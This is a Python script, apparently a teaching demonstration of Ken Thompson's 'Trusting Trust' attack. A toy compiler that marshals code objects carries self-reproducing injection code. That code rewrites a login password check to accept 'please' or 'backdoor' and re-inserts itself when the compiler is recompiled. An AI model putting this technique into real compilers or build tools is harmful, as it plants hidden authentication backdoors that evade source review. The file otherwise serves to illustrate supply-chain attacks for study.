#!/usr/local/bin/python3
"""
The compiler is really the code object on disk as compiler.marshal, and this is
the source used to generate that "binary".
"""

import marshal
import sys
import inspect


def build( inPath, outPath ):
    print( 'Building %s...' %inPath )
    with open( inPath, 'r' ) as f:
        source = ''
        for line in f.readlines():

            # START SHADINESS

            # The obviously malicious code we're inspired to hide (step 1)
            #if 'password ==' in line and 'login_app.py' == inPath:
            #    line = app_line

            # Uncomment this block and recompile for step 2 of Trusting Trust
            app_cond = 'if \'password ==\' in line and \'login_app.py\' == inPath:'
            app_line = 'line = \'if password == \\\'please\\\' or password == \\\'backdoor\\\':\''
            comp_cond = 'if \'for line in f.readlines\' in line and \'thisword\' not in line:'
            comp_line = r'''
            app_cond = "%s"
            app_line = "%s"
            comp_cond = "%s"
            comp_line = "%%s" %% REPLACE
            %s
                %s
                source += line
                continue
            %s
                cl = comp_line%( app_cond, app_line, comp_cond, app_cond,
                                 app_line, comp_cond )
                line += cl.replace( 'REPLACE', '\'\'\'+comp_line+'\'\'\'' ) '''

            if 'for line in f.readlines' in line and 'if' not in line:
                cl = comp_line%( app_cond, app_line, comp_cond, app_cond,
                                 app_line, comp_cond )
                line += cl.replace( 'REPLACE', '\'\'\''+comp_line+'\'\'\'' )

            # Step 3, delete (comment out) all the malicious code

            # END SHADINESS

            source += line
    print( source )
    co = compile( source, inPath, 'exec' )
    with open( outPath, 'wb' ) as f:
        marshal.dump( co, f )
    print( 'Done' )

def getOutputFile( inPath ):
    return inPath[:-3] + '.marshal'

def printUsage():
    print( 'Usage: compiler.py input' )


""" Need to know if called indirectly through the marshal'd object. """
caller = inspect.stack()
if len( caller ) == 1:
    """ Assume called directly. """
    if len( sys.argv ) < 2:
        printUsage()
    else:
        build( sys.argv[1], getOutputFile( sys.argv[1] ) )
else:
    """ Assume called via runner.py """
    if len( sys.argv ) < 3:
        """ Because executed from runner.py, arg to compiler will actually be
        third element. If running something else, ignore the complaining. """
        printUsage()
    else:
        build( sys.argv[2], getOutputFile( sys.argv[2] ) )
